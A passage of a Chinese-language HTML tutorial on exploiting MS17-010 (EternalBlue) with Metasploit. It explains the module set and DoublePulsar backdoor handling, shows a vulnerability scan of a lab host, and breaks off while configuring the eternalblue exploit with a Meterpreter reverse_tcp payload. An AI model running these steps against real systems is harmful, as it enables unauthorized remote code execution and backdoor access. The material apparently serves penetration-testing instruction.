&lt;/span&gt;&lt;span class="lnt"&gt;39
&lt;/span&gt;&lt;span class="lnt"&gt;40
&lt;/span&gt;&lt;span class="lnt"&gt;41
&lt;/span&gt;&lt;span class="lnt"&gt;42
&lt;/span&gt;&lt;span class="lnt"&gt;43
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; search ms17-010
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Matching &lt;span class="nv"&gt;Modules&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Name Disclosure Date Rank Check Description&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; - ---- --------------- ---- ----- -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;0&lt;/span&gt; exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Automatic Target . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;7&lt;/span&gt; . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows Embedded Standard &lt;span class="m"&gt;7&lt;/span&gt; . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2 . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;8&lt;/span&gt; . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows 8.1 . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows Server &lt;span class="m"&gt;2012&lt;/span&gt; . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;10&lt;/span&gt; Pro . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Windows &lt;span class="m"&gt;10&lt;/span&gt; Enterprise Evaluation . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;10&lt;/span&gt; exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Automatic . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: PowerShell . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;13&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Native upload . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: MOF upload . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALSYNERGY . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALROMANCE . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALCHAMPION . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;18&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALBLUE . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;19&lt;/span&gt; auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALSYNERGY . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;21&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALROMANCE . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALCHAMPION . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALBLUE . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;24&lt;/span&gt; auxiliary/scanner/smb/smb_ms17_010 . normal No MS17-010 SMB RCE Detection
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: DOUBLEPULSAR . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;26&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; AKA: ETERNALBLUE . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;27&lt;/span&gt; exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Execute payload &lt;span class="o"&gt;(&lt;/span&gt;x64&lt;span class="o"&gt;)&lt;/span&gt; . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="se"&gt;\_&lt;/span&gt; target: Neutralize implant . . . .
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Interact with a module by name or index. For example info 29, use &lt;span class="m"&gt;29&lt;/span&gt; or use exploit/windows/smb/smb_doublepulsar_rce
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;After interacting with a module you can manually &lt;span class="nb"&gt;set&lt;/span&gt; a TARGET with &lt;span class="nb"&gt;set&lt;/span&gt; TARGET &lt;span class="s1"&gt;&amp;#39;Neutralize implant&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;以上为metasploit中的ms17-010（永恒之蓝）模块。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;MS17-010 (永恒之蓝) 漏洞利用套件详解&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;主要攻击模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a. exploit/windows/smb/ms17_010_eternalblue (索引 0-9)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;介绍&lt;/strong&gt;： 这是最著名、最直接的攻击模块。它利用SMBv1协议的内核级漏洞，通过越界写入破坏内核内存池，实现远程代码执行。攻击过程直接在内核态进行，极其“暴力”。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;： SMB协议远程内核池破坏漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用方式&lt;/strong&gt;： 发送特制SMBv1数据包触发内核内存破坏。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目标系统&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Windows 7 / Server 2008 R2（主要目标）&lt;/li&gt;
&lt;li&gt;Windows 8/8.1 / Server 2012&lt;/li&gt;
&lt;li&gt;Windows 10 Pro/Enterprise&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无需任何身份验证&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;对Windows 7/2008 R2成功率较高。&lt;/li&gt;
&lt;li&gt;操作风险高：由于直接操作内核内存，若堆喷射失败，极易导致目标系统&lt;strong&gt;蓝屏死机(BSOD)&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;依赖目标开启445端口。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关键参数&lt;/strong&gt;： &lt;code&gt;GroomAllocations&lt;/code&gt;。调整此内存分配参数有时能在攻击失败时提高成功率。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;b. exploit/windows/smb/ms17_010_psexec (索引 10-18)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;介绍&lt;/strong&gt;： 此模块不一定需要凭证。它主要利用&lt;strong&gt;EternalRomance&lt;/strong&gt;等漏洞链，通过SMB命名管道中的类型混淆漏洞进行攻击。相比EternalBlue更稳定，是攻击更新系统（如Win10）的首选。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;技术集合&lt;/strong&gt;： 融合了多个SMB漏洞，包括EternalRomance、EternalSynergy、EternalChampion。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目标类型&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;PowerShell&lt;/strong&gt;： 通过PowerShell在内存中执行载荷。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Native upload&lt;/strong&gt;： 直接上传可执行文件执行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MOF upload&lt;/strong&gt;： 使用WMI托管对象格式执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;比EternalBlue&lt;strong&gt;更稳定&lt;/strong&gt;，几乎不会导致蓝屏。&lt;/li&gt;
&lt;li&gt;支持多种载荷传输和执行方式。&lt;/li&gt;
&lt;li&gt;如果拥有有效的SMB凭证（即使是普通用户），成功率接近100%。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;辅助模块&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;a. auxiliary/scanner/smb/smb_ms17_010 (索引 24-26)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;介绍&lt;/strong&gt;： &lt;strong&gt;攻击前必备的侦察模块&lt;/strong&gt;。用于安全地检测目标主机是否存在MS17-010漏洞，并检查是否已被植入DoublePulsar后门。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;检测目标是否存在MS17-010漏洞。&lt;/li&gt;
&lt;li&gt;检测目标是否已感染DoublePulsar后门。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;输出解读&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;VULNERABLE&lt;/code&gt;： 目标存在漏洞，可尝试攻击。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DoublePulsar detected&lt;/code&gt;： 目标已被攻破，内存中驻留有后门。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;非入侵性，仅用于信息收集。&lt;/li&gt;
&lt;li&gt;支持扫描整个网段（&lt;code&gt;set RHOSTS 192.168.1.0/24&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;b. auxiliary/admin/smb/ms17_010_command (索引 19-23)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;介绍&lt;/strong&gt;： 一个轻量级的命令执行模块。不返回交互式Shell，仅执行单条系统命令并返回结果。适用于快速、隐蔽的任务。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;： 在已确认存在漏洞或已被控的系统上执行命令。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;用途&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;后渗透阶段快速执行命令（如&lt;code&gt;whoami&lt;/code&gt;、添加用户）。&lt;/li&gt;
&lt;li&gt;在不建立持久连接的情况下进行操作。&lt;/li&gt;
&lt;li&gt;同样支持EternalRomance等多种利用方式。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;后门利用模块&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;exploit/windows/smb/smb_doublepulsar_rce (索引 27-29)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DoublePulsar是什么&lt;/strong&gt;： 一个隐蔽的、无文件落地的内存SMB后门，通常由EternalBlue攻击成功后植入。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;核心功能&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Execute payload&lt;/strong&gt;： 若发现目标已存在DoublePulsar后门，可直接通过此后门注入DLL或执行代码，&lt;strong&gt;无需再次触发原始漏洞&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Neutralize implant&lt;/strong&gt;： 在渗透测试结束后，专业地&lt;strong&gt;清除&lt;/strong&gt;内存中的后门痕迹。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;目标选项&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;注入载荷&lt;/strong&gt;： 利用现有后门执行代码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;清除后门&lt;/strong&gt;： 卸载DoublePulsar植入物。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;高级配置选项（通用）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些参数在多数相关模块中通用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;RHOST&lt;/code&gt; / &lt;code&gt;RHOSTS&lt;/code&gt;&lt;/strong&gt;： 目标IP地址或IP范围（如&lt;code&gt;192.168.1.10&lt;/code&gt;或&lt;code&gt;192.168.1.0/24&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;RPORT&lt;/code&gt;&lt;/strong&gt;： SMB服务端口，默认为&lt;code&gt;445&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;SMBUser&lt;/code&gt; / &lt;code&gt;SMBPass&lt;/code&gt;&lt;/strong&gt;： SMB用户名和密码（对于&lt;code&gt;psexec&lt;/code&gt;模块尤其重要）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;VERIFY_ARCH&lt;/code&gt;&lt;/strong&gt;： 是否验证目标系统架构（64位/32位）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;VERIFY_TARGET&lt;/code&gt;&lt;/strong&gt;： 是否验证目标操作系统版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;GroomAllocations&lt;/code&gt;&lt;/strong&gt;： &lt;strong&gt;(EternalBlue专用)&lt;/strong&gt; 调整初始内存分配请求的数量，以影响内核内存布局。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="三探测目标主机"&gt;三、探测目标主机
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;span class="lnt"&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; use &lt;span class="m"&gt;24&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; rhost 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;rhost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; x64 &lt;span class="o"&gt;(&lt;/span&gt;64-bit&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator &lt;span class="s1"&gt;&amp;#39;+&amp;#39;&lt;/span&gt; and &lt;span class="s1"&gt;&amp;#39;?&amp;#39;&lt;/span&gt; was replaced with &lt;span class="s1"&gt;&amp;#39;*&amp;#39;&lt;/span&gt; in regular expression
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Scanned &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; hosts &lt;span class="o"&gt;(&lt;/span&gt;100% &lt;span class="nb"&gt;complete&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Auxiliary module execution completed
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;关键信息：&lt;code&gt;Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id="四漏洞利用"&gt;四、漏洞利用
&lt;/h4&gt;&lt;p&gt;切换&lt;code&gt;exploit&lt;/code&gt;模块 -&amp;gt; 设置靶机IP -&amp;gt; 设置攻击机IP -&amp;gt; 设置载荷 -&amp;gt; 检察配置信息 -&amp;gt; &lt;code&gt;run&lt;/code&gt; -&amp;gt; 权限验证&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;span class="lnt"&gt;37
&lt;/span&gt;&lt;span class="lnt"&gt;38
&lt;/span&gt;&lt;span class="lnt"&gt;39
&lt;/span&gt;&lt;span class="lnt"&gt;40
&lt;/span&gt;&lt;span class="lnt"&gt;41
&lt;/span&gt;&lt;span class="lnt"&gt;42
&lt;/span&gt;&lt;span class="lnt"&gt;43
&lt;/span&gt;&lt;span class="lnt"&gt;44
&lt;/span&gt;&lt;span class="lnt"&gt;45
&lt;/span&gt;&lt;span class="lnt"&gt;46
&lt;/span&gt;&lt;span class="lnt"&gt;47
&lt;/span&gt;&lt;span class="lnt"&gt;48
&lt;/span&gt;&lt;span class="lnt"&gt;49
&lt;/span&gt;&lt;span class="lnt"&gt;50
&lt;/span&gt;&lt;span class="lnt"&gt;51
&lt;/span&gt;&lt;span class="lnt"&gt;52
&lt;/span&gt;&lt;span class="lnt"&gt;53
&lt;/span&gt;&lt;span class="lnt"&gt;54
&lt;/span&gt;&lt;span class="lnt"&gt;55
&lt;/span&gt;&lt;span class="lnt"&gt;56
&lt;/span&gt;&lt;span class="lnt"&gt;57
&lt;/span&gt;&lt;span class="lnt"&gt;58
&lt;/span&gt;&lt;span class="lnt"&gt;59
&lt;/span&gt;&lt;span class="lnt"&gt;60
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 auxiliary&lt;span class="o"&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; use &lt;span class="m"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using configured payload windows/x64/meterpreter/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; rhost 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;rhost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; lhost 10.0.0.223
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;lhost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.223
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp
